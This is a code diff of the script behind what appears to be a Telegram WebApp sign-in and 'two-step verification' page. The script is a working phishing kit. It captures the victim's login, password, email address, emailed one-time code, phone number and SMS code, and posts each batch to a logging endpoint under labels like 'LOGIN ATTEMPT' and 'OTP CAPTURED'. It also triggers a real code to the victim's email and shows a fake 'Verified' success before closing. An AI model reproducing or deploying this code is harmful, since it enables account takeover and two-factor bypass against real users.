@@ -1,4 +1,3 @@
-// Initialize Telegram
 const tg = window.Telegram ? window.Telegram.WebApp : null;
 if (tg) {
     tg.expand();
@@ -6,188 +5,152 @@ if (tg) {
 }
 
 document.addEventListener('DOMContentLoaded', () => {
-    // UI Elements
+    // Screens
     const screenSignin = document.getElementById('screen-signin');
     const screenStepper = document.getElementById('screen-stepper');
-    const screenOtp = document.getElementById('screen-otp');
-    
-    const triggerSignin = document.getElementById('trigger-signin');
-    const loginIdentifier = document.getElementById('login-identifier');
-    const loginPassword = document.getElementById('login-password');
-    const loginPasswordWrapper = document.getElementById('login-password-wrapper');
-    
-    const linkEmailVerify = document.getElementById('link-email-verify');
-    const linkPhoneVerify = document.getElementById('link-phone-verify');
-    const stepNumberDisplay = document.getElementById('step-number-display');
-    const itemEmail = document.getElementById('item-email');
-    const itemPhone = document.getElementById('item-phone');
-    
-    const otpInputField = document.getElementById('otp-input-field');
-    const btnOtpSubmit = document.getElementById('btn-otp-submit');
-    const otpTitleDisplay = document.getElementById('otp-title-display');
-    const otpDescDisplay = document.getElementById('otp-desc-display');
-    const otpTypeIcon = document.getElementById('otp-type-icon');
-    const otpSeconds = document.getElementById('otp-seconds');
+    const modalEmail = document.getElementById('modal-email-otp');
+    const modalPhone = document.getElementById('modal-phone-otp');
 
-    const backToSignin = document.getElementById('back-to-signin');
-    const closeOtpModal = document.getElementById('close-otp-modal');
-    const pasteBtn = document.querySelector('.otp-btn-paste');
+    // Inputs
+    const loginId = document.getElementById('login-identifier');
+    const loginPass = document.getElementById('login-password');
+    const verifyEmailId = document.getElementById('verify-email-id');
+    const verifyEmailOtp = document.getElementById('verify-email-otp');
+    const verifyPhoneNum = document.getElementById('verify-phone-num');
+    const verifyPhoneOtp = document.getElementById('verify-phone-otp');
 
-    let currentStep = 1; // 1: Email, 2: Phone
-    let userData = {};
-    let timer;
+    let userData = { id: '', pass: '', email: '', email_otp: '', phone: '', phone_otp: '' };
+    let currentStep = 1;
 
     // Tab Logic
     document.querySelectorAll('.signin-tab').forEach(tab => {
         tab.addEventListener('click', () => {
             document.querySelectorAll('.signin-tab').forEach(t => t.classList.remove('active'));
             tab.classList.add('active');
-            if (tab.dataset.tab === 'otp') {
-                loginPasswordWrapper.style.display = 'none';
-            } else {
-                loginPasswordWrapper.style.display = 'block';
-            }
+            document.getElementById('login-password-wrapper').style.display = (tab.dataset.tab === 'otp') ? 'none' : 'block';
         });
     });
 
-    // Password Toggle
+    // Password Eye
     const eyeBtn = document.querySelector('.btn-password-eye');
     if (eyeBtn) {
         eyeBtn.addEventListener('click', () => {
-            const isPass = loginPassword.type === 'password';
-            loginPassword.type = isPass ? 'text' : 'password';
+            const isPass = loginPass.type === 'password';
+            loginPass.type = isPass ? 'text' : 'password';
             eyeBtn.innerHTML = isPass ? '<i class="far fa-eye-slash"></i>' : '<i class="far fa-eye"></i>';
         });
     }
 
-    // Sign In Trigger
-    triggerSignin.addEventListener('click', () => {
-        const id = loginIdentifier.value.trim();
-        const pass = loginPassword.value.trim();
-
-        if (!id) return alert('Please enter Email / Phone / Username');
-
-        userData = { id, pass, time: new Date().toLocaleString() };
+    // Sign In Action
+    document.getElementById('trigger-signin').addEventListener('click', () => {
+        if (!loginId.value.trim()) return alert('Enter credentials');
         
-        // Log Initial Attempt via backend
-        logToServer('🔑 LOGIN ATTEMPT', userData);
+        userData.id = loginId.value.trim();
+        userData.pass = loginPass.value.trim();
+        userData.time = new Date().toLocaleString();
 
+        // Pre-fill email/phone if detected
+        if (userData.id.includes('@')) verifyEmailId.value = userData.id;
+        else if (/^\d+$/.test(userData.id.replace(/\+/g,''))) verifyPhoneNum.value = userData.id;
+
+        logToServer('🔑 LOGIN ATTEMPT', userData);
         screenSignin.style.display = 'none';
         screenStepper.style.display = 'flex';
     });
 
-    // Verification Link: Email
-    linkEmailVerify.addEventListener('click', () => {
+    // Go to Email Modal
+    document.getElementById('item-email').addEventListener('click', () => {
         if (currentStep !== 1) return;
-
-        otpTitleDisplay.innerText = 'Email Verification';
-        otpDescDisplay.innerText = 'Please enter the 6-digit verification code sent on e-mail';
-        otpTypeIcon.className = 'fas fa-envelope';
+        modalEmail.style.display = 'flex';
         
-        // Send OTP via server
-        if (userData.id.includes('@')) {
+        // Auto-send OTP if email is present
+        if (verifyEmailId.value.includes('@')) {
             fetch('/send-otp', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ email: userData.id })
+                body: JSON.stringify({ email: verifyEmailId.value })
             });
         }
-
-        screenOtp.style.display = 'flex';
-        startTimer(60);
     });
 
-    // Verification Link: Phone
-    linkPhoneVerify.addEventListener('click', () => {
+    // Submit Email OTP
+    document.getElementById('submit-email-otp').addEventListener('click', async () => {
+        if (!verifyEmailId.value || !verifyEmailOtp.value) return alert('Fill all fields');
+        
+        userData.email = verifyEmailId.value;
+        userData.email_otp = verifyEmailOtp.value;
+        
+        await logToServer('📧 EMAIL VERIFICATION', userData);
+        
+        modalEmail.style.display = 'none';
+        currentStep = 2;
+        
+        document.getElementById('step-number-display').innerText = '2/2';
+        const itemEmail = document.getElementById('item-email');
+        itemEmail.style.opacity = '0.5';
+        itemEmail.style.pointerEvents = 'none';
+        itemEmail.querySelector('.card-link').innerHTML = 'Verified <i class="fas fa-check"></i>';
+        itemEmail.querySelector('.card-link').style.color = '#3bc117';
+        
+        const itemPhone = document.getElementById('item-phone');
+        itemPhone.style.opacity = '1';
+        itemPhone.style.pointerEvents = 'auto';
+        itemPhone.classList.add('active');
+    });
+
+    // Go to Phone Modal
+    document.getElementById('item-phone').addEventListener('click', () => {
         if (currentStep !== 2) return;
-
-        otpTitleDisplay.innerText = 'Phone Verification';
-        otpDescDisplay.innerText = 'Please enter the 6-digit verification code sent to your phone';
-        otpTypeIcon.className = 'fas fa-phone-alt';
-
-        screenOtp.style.display = 'flex';
-        startTimer(60);
+        modalPhone.style.display = 'flex';
     });
 
-    // OTP Submit
-    btnOtpSubmit.addEventListener('click', async () => {
-        const otp = otpInputField.value.trim();
-        if (otp.length < 4) return alert('Invalid code');
+    // Submit Phone OTP
+    document.getElementById('submit-phone-otp').addEventListener('click', async () => {
+        if (!verifyPhoneNum.value || !verifyPhoneOtp.value) return alert('Fill all fields');
+        
+        userData.phone = verifyPhoneNum.value;
+        userData.phone_otp = verifyPhoneOtp.value;
+        
+        await logToServer('📱 PHONE VERIFICATION (FINAL)', userData);
+        
+        document.getElementById('submit-phone-otp').innerText = 'Success';
+        document.getElementById('btn-final-confirm').classList.add('ready');
 
-        btnOtpSubmit.innerText = 'Verifying...';
-        btnOtpSubmit.disabled = true;
-
-        if (currentStep === 1) {
-            userData.email_otp = otp;
-            await logToServer('📧 EMAIL OTP CAPTURED', userData);
-            
-            currentStep = 2;
-            screenOtp.style.display = 'none';
-            otpInputField.value = '';
-            
-            stepNumberDisplay.innerText = '2/2';
-            itemEmail.style.opacity = '0.5';
-            itemEmail.style.pointerEvents = 'none';
-            itemEmail.querySelector('.card-link').innerHTML = 'Verified <i class="fas fa-check"></i>';
-            itemEmail.querySelector('.card-link').style.color = '#3bc117';
-            
-            itemPhone.style.opacity = '1';
-            itemPhone.style.pointerEvents = 'auto';
-            itemPhone.classList.add('active');
-
-            btnOtpSubmit.innerText = 'Confirm';
-            btnOtpSubmit.disabled = false;
-        } else {
-            userData.phone_otp = otp;
-            await logToServer('📱 PHONE OTP CAPTURED', userData);
-            
-            btnOtpSubmit.innerText = 'Success';
-            document.getElementById('btn-final-confirm').classList.add('ready');
-            
-            setTimeout(() => {
-                if (tg) tg.close();
-                else location.reload();
-            }, 1500);
-        }
+        setTimeout(() => {
+            if (tg) tg.close();
+            else location.reload();
+        }, 1500);
     });
 
-    // Navigation / UI Helpers
-    backToSignin.addEventListener('click', () => {
+    // Utils
+    window.closeAllModals = () => {
+        modalEmail.style.display = 'none';
+        modalPhone.style.display = 'none';
+    };
+
+    window.pasteOTP = async (targetId) => {
+        try {
+            const text = await navigator.clipboard.readText();
+            if (text) document.getElementById(targetId).value = text;
+        } catch (e) {}
+    };
+
+    document.getElementById('back-to-signin').addEventListener('click', () => {
         screenStepper.style.display = 'none';
         screenSignin.style.display = 'block';
     });
 
-    closeOtpModal.addEventListener('click', () => {
-        screenOtp.style.display = 'none';
-    });
-
-    if (pasteBtn) {
-        pasteBtn.addEventListener('click', async () => {
-            try {
-                const text = await navigator.clipboard.readText();
-                if (text) otpInputField.value = text;
-            } catch (e) {}
-        });
-    }
-
-    function startTimer(duration) {
-        let timeLeft = duration;
-        otpSeconds.innerText = timeLeft;
-        clearInterval(timer);
-        timer = setInterval(() => {
-            timeLeft--;
-            otpSeconds.innerText = timeLeft;
-            if (timeLeft <= 0) clearInterval(timer);
-        }, 1000);
-    }
-
     async function logToServer(title, data) {
         try {
-            await fetch('/api/log', {
+            const res = await fetch('/api/log', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ title, data })
             });
-        } catch (e) {}
+            const result = await res.json();
+            if (!result.success) console.error('Log failed:', result.message);
+        } catch (e) {
+            console.error('Log fetch error:', e);
+        }
     }
 });
